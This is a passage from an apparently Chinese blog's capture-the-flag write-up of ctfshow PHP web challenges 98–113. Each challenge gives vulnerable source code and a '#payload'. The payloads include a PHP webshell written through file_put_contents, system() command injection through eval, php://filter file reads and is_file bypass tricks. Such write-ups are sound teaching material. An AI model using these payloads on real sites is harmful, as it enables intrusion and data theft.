class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">'flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'HTTP_FLAG'</span>]==<span class="string">'flag'</span>)&#123;</span><br><span class="line">highlight_file($_GET[<span class="string">'HTTP_FLAG'</span>]==<span class="string">'flag'</span>);<span class="comment">//获取flag的条件</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:HTTP_FLAG=flag</span><br><span class="line">POST:HTTP_FLAG=flag</span><br></pre></td></tr></table></figure><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><p>学习到了新东西，快乐了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$allow = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">36</span>; $i &lt; <span class="number">0x36d</span>; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(<span class="number">1</span>,$i));<span class="comment">//写入数组</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'n'</span>]) &amp;&amp; in_array($_GET[<span class="string">'n'</span>], $allow))&#123;</span><br><span class="line">    <span class="comment">//in_array函数漏洞，当第三个参数未设置时，会把文件名后缀去除，也是就保留前面部分</span></span><br><span class="line">    file_put_contents($_GET[<span class="string">'n'</span>], $_POST[<span class="string">'content'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组里被压入了一些数字，必须保证传入的n包含数字才能够写入文件</p><p>开始以为是只要包含数字就可以，其实不然，分析放在上面了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:n=<span class="number">13.</span>php</span><br><span class="line">POST:content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>之后选择蚁剑连接或是直接读取都可</p><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;/"</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/\;/"</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"$v2('ctfshow')$v3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要满足v1是数字即可，还必须包括分号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span>&amp;v3=;system(<span class="string">'ls'</span>);;</span><br></pre></td></tr></table></figure><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">'v1'</span>];</span><br><span class="line">$v2=$_GET[<span class="string">'v2'</span>];</span><br><span class="line">$v3=$_GET[<span class="string">'v3'</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"$v2('ctfshow')$v3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用函数打印对象里面的属性，这里有一个Reflectionclass</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">通过ReflectionClass，我们可以得到Person类的以下信息：</span><br><span class="line"><span class="number">1.</span>常量 Contants</span><br><span class="line"><span class="number">2.</span>属性 Property Names</span><br><span class="line"><span class="number">3.</span>方法 Method Names静态</span><br><span class="line"><span class="number">4.</span>属性 <span class="keyword">Static</span> Properties</span><br><span class="line"><span class="number">5.</span>命名空间 <span class="keyword">Namespace</span></span><br><span class="line">6.Person类是否为final或者abstract</span><br><span class="line"><span class="number">7.</span>Person类是否有某个方法</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> Reflectionclass&amp;v3=;</span><br></pre></td></tr></table></figure><h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与web103相同，直接看103的分析</p><h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);<span class="comment">//is_numeric函数判断是否为数值，并进行与运算</span></span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);<span class="comment">//截取第二个字符之后所有的内容</span></span><br><span class="line">    $str = call_user_func($v1,$s);<span class="comment">//调用函数</span></span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/.*p.*h.*p.*/i"</span>,$str))&#123;<span class="comment">//过滤php后缀名</span></span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Sorry'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个注意点，就是在php7中</p><img src="/2020/09/25/PHPcharacter/1.png" class=""><p>所以这里不能用16进制绕过了</p><p>这道题看的出题人的payload，小小疑问，太需要运气了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:v2=<span class="number">225044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=g.php</span></span><br><span class="line">POST:v1=hex2bin</span><br><span class="line"></span><br><span class="line"><span class="comment">//详细说说</span></span><br><span class="line"><span class="comment">//v2是先经过base64再hex加密的shell，原型是<span class="meta">&lt;?</span>=`cat *`;</span></span><br><span class="line"><span class="comment">//说要运气是v2中刚好只有一个e，就是科学计数法，也就是数值了</span></span><br><span class="line"><span class="comment">//v3用伪协议</span></span><br><span class="line"><span class="comment">//v1的hex2bin是为了将16进制转化回ascii字符，前面的22是加的，绕过substr的截断</span></span><br></pre></td></tr></table></figure><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//没get到考点，应该是出题人可能少打了个‘=’，传一样的值就行</span></span><br></pre></td></tr></table></figure><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$error=<span class="string">'你还想要flag嘛？'</span>;</span><br><span class="line">$suces=<span class="string">'既然你想要那给你吧！'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key===<span class="string">'error'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"what are you doing?!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($value===<span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"what are you doing?!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'flag'</span>]==$flag))&#123;</span><br><span class="line">    <span class="keyword">die</span>($error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"your are good"</span>.$flag.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($suces);</span><br></pre></td></tr></table></figure><p>经典变量覆盖，开始没找到点，后来出题师傅说要用<code>die($error)</code>,这就懂了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">POST：error=$flag&amp;flag=$$flag</span><br><span class="line">GET：$flag=flag</span><br><span class="line">分析：</span><br><span class="line">post：</span><br><span class="line">error=$flag=&gt;$error=$$flag</span><br><span class="line">要让$error=$flag拿到flag，这一步的前提是$_POST[<span class="string">'flag'</span>]!=$flag</span><br><span class="line">get:</span><br><span class="line">$flag=flag=&gt;$$flag=$flag</span><br><span class="line">post:</span><br><span class="line">flag=$$flag</span><br></pre></td></tr></table></figure><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组绕过即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:v2[]=<span class="number">2</span></span><br><span class="line">POST:v1[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'v1'</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">       parse_str($v1,$v2);</span><br><span class="line">       <span class="keyword">if</span>($v2[<span class="string">'flag'</span>]==md5($v3))&#123;</span><br><span class="line">           <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parse_str()</code>变量覆盖，MD5相等只需要找到加密后以<code>0e</code>开头，纯数字的即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">GET:v3&#x3D;240610708</span><br><span class="line">POST:v1&#x3D;flag&#x3D;0e1</span><br></pre></td></tr></table></figure><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z]+$"</span>, $_GET[<span class="string">'c'</span>])===<span class="keyword">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev($_GET[<span class="string">'c'</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能出现字母，并且字符串倒序取整的值，<code>%00</code>截断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">c&#x3D;a%00778</span><br></pre></td></tr></table></figure><h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]+/'</span>, $v1) &amp;&amp; preg_match(<span class="string">'/[a-zA-Z]+/'</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"echo new $v1($v2());"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>用到了异常类，看到格式想着是类，但是没有想到抛出异常类，问了羽师傅，拿到了payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="number">1.</span>v1=<span class="keyword">Exception</span>;system(<span class="string">"cat%20fl36dg.txt"</span>);<span class="comment">//&amp;v2=a</span></span><br><span class="line"><span class="number">2.</span>v1=<span class="keyword">Exception</span>;<span class="comment">//&amp;v2=system("cat%20fl36dg.txt");</span></span><br></pre></td></tr></table></figure><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"echo new $v1($v2());"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;phpff.com&#x2F;filesystemiterator</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;class.filesystemiterator.php</span><br></pre></td></tr></table></figure><p>利用filesystemiterator类带出指定目录下的所有文件</p><p><code>getcwd</code>，查看当前路径下的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure><h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">(&amp;$v1,&amp;$v2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"$$v1 = &amp;$$v2;"</span>);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/'</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/'</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/ctfshow/'</span>, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//变量覆盖+GLOBALS全局变量</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hacker!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hacker!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用php伪协议，过滤rot13，string，base64，可以用base16或者base32等绕过</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">?file=php:<span class="comment">//filter/read=convert.base16-encode/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.icnov.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hacker!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filter过滤器被过滤，伪协议用不了了</p><p>这里主要是要绕过<code>is_file()</code>这个php的内置函数</p><p>这里查阅资料可以构造软链接，超过二十次就可以绕过<code>is_file</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?file=/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span 